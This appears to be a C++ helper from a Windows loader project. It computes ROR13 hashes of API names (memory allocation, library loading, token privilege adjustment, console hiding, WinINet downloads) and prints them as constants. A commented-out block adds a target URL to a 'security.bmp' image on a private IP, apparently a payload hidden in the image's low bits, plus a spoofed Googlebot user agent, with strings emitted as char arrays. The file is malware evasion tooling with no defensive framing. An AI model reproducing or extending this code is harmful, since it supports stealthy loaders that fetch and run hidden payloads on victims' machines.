/*
	Simple header file to define all of the Ror13 Libraries and functions desired
*/

#include "Ror13.h"

#include <stdio.h>
#include <stdlib.h>

#define ARRAY_LENGTH(ARY) \
	((ARY == NULL) ? 0 : (sizeof(ARY) / sizeof(ARY[0])))

namespace Ror13{
	ROR13 _KERNEL_32_DLL[] = {
		ROR13("HeapAlloc"),
		ROR13("HeapFree"),
		ROR13("GetProcessHeap"),
		ROR13("FreeLibrary"),
		ROR13("LoadLibraryA"),
		ROR13("GetProcAddress"),
		ROR13("CloseHandle"),
		ROR13("IsWow64Process"),
		ROR13("VirtualAlloc"),
		ROR13("VirtualFree"),
		ROR13("GetConsoleWindow")
	};
	
	ROR13 _USER32_DLL[] = {
		ROR13("ShowWindow")
	};

	ROR13 _ADVAPI32_DLL[] = {
		ROR13("AdjustTokenPrivileges"),
		ROR13("OpenProcessToken")
	};

	ROR13 _WININET_DLL[] = {
		ROR13("InternetOpenA"),
		ROR13("InternetOpenUrlA"),
		ROR13("InternetQueryDataAvailable"),
		ROR13("InternetReadFile"),
		ROR13("InternetCloseHandle")
	};

	ROR13Lib LIBS[] = {
		ROR13Lib("kernel32.dll", _KERNEL_32_DLL, ARRAY_LENGTH(_KERNEL_32_DLL), TRUE),
		ROR13Lib("Advapi32.dll", _ADVAPI32_DLL, ARRAY_LENGTH(_ADVAPI32_DLL)),
		ROR13Lib("User32.dll", _USER32_DLL, ARRAY_LENGTH(_USER32_DLL)),
		ROR13Lib("Wininet.dll", _WININET_DLL, ARRAY_LENGTH(_WININET_DLL))
	};

	void print_all_libaries()
	{
		printf("/*\n");
		printf("\tPre - processor declarations for ROR 13 constants\n");
		printf("\n");
		printf("\tFormat: #define <LIB>_<FUNC> 0x<ror13 hash>\n");
		printf("*/\n");
		printf("\n");

		for (int k = 0; k < ARRAY_LENGTH(LIBS); k++)
		{
			LIBS[k].print_library();
			
			printf("\n");
		}
	}

	/*typedef struct STRING_DEFINE {
		char * name;
		char * str;
		
		STRING_DEFINE(char * _name, char * _str)
		{
			this->name = (char *)malloc(strlen(_name) + 1);
			strncpy(this->name, _name, strlen(_name));
			
			this->str = (char *)malloc(strlen(_str) + 1);
			strncpy(this->str, _str, strlen(_str) + 1);
		}

	} STRING_DEFINE;

	STRING_DEFINE STRINGS[] = {
		STRING_DEFINE("LSB_TARGET_URL", "http://10.248.187.21/security.bmp"),
		STRING_DEFINE("USER_AGENT", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
	};

	void print_all_strings()
	{
		for (int k = 0; k < ARRAY_LENGTH(STRINGS); k++)
		{
			printf("#ifndef %s\n", STRINGS[k].name);
			printf("\t#define %s {", STRINGS[k].name);

			for (int i = 0; i < strlen(STRINGS[k].str); i++)
			{
				printf("'%c', ", STRINGS[k].str[i]);
			}

			printf("}\n");

			printf("#endif\n");
		}
		printf("\n");
	}*/
};

/*#define PRINT_STRINGS() \
	Ror13::print_all_strings()*/

#define PRINT_LIBS() \
	Ror13::print_all_libaries()